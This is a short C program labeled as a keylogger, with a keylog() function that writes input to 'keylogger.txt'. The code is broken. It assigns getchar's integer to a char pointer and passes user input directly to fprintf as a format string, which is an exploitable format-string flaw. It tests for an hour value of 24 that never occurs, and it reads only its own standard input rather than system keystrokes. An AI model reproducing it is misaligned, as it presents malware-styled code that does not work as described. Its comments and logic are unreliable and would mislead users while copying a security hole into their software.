#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// Function to log keystrokes
int keylog()
{
    // Open file in write mode
    FILE * fPtr;
    fPtr = fopen("keylogger.txt", "w+");

    // Get a character from the user
    const char *a = getchar();
    
    // Check if the character is not NULL
    if(a != NULL)
        // Write the character to the file
        fprintf(fPtr, a);
    
    // Get the current time
    time_t now = time(NULL);
    // Get the local time
    struct tm *tm_struct = localtime(&now);
    // Get the hour from the local time
    int hour = tm_struct->tm_hour;
    
    // Check if the hour is 24
    if(hour == 24)
        // Close the file
        fclose(fPtr);
}

int main()
{
    // Call the keylog function
    keylog();
}